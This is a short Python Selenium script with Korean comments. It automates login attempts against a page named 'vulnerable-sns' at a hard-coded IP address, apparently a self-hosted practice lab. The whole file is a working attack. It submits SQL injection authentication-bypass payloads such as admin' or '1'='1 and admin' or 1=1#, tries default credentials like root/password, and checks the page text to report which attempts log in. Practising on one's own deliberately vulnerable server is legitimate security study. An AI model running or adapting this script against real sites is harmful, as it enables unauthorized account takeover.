from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

# 브라우저 드라이버 설정 (Chrome 기준)
driver = webdriver.Chrome()  # 첫 실행 시 ChromeDriver가 PATH에 있어야 합니다

# 로그인 페이지 열기
driver.get("http://18.179.53.107/vulnerable-sns/www/login.php")  # ⚠️ 본인 서버 주소로 변경

# PAYLOADS 정의
PAYLOADS = [
    ("admin' or '1'='1", "1234", "관리자 계정 SQLi"),
    ("admin' or 1=1#","1234", "관리자 계정 SQLi"),
    ("admin", "1234' or '1'='1", "관리자 계정 SQLi"),
    ("user1", "password123", "테스트 계정"),
    ("root", "password", "루트 기본 비번")
]

# 각 계정으로 로그인 시도
for i, (username, password, desc) in enumerate(PAYLOADS, 1):
    print(f"[{i}] {desc} → {username}/{password} 시도 중...")

    # 입력창 찾기 (name 속성 기준)
    username_field = driver.find_element(By.NAME, "username")
    password_field = driver.find_element(By.NAME, "password")

    # 기존 입력값 초기화
    username_field.clear()
    password_field.clear()

    # 아이디 / 비밀번호 입력
    username_field.send_keys(username)
    password_field.send_keys(password)
    password_field.send_keys(Keys.RETURN)  # Enter로 제출

    # 페이지가 로드될 때 잠깐 대기
    time.sleep(2)

    # 페이지 내용 확인 (로그인 성공 여부 판단)
    if "로그아웃" in driver.page_source or "환영합니다" in driver.page_source:
        print(f"✅ 로그인 성공! ({username}/{password})")
    else:
        print(f"❌ 로그인 실패. ({username}/{password})")

    driver.get("http://18.179.53.107/vulnerable-sns/www/logout.php")
    time.sleep(1)

    # 다시 로그인 페이지로 돌아가기
    driver.get("http://18.179.53.107/vulnerable-sns/www/login.php")  # ⚠️ 본인 로그인 URL로 변경
    time.sleep(3)

# 테스트 종료 후 브라우저 닫기
driver.quit()
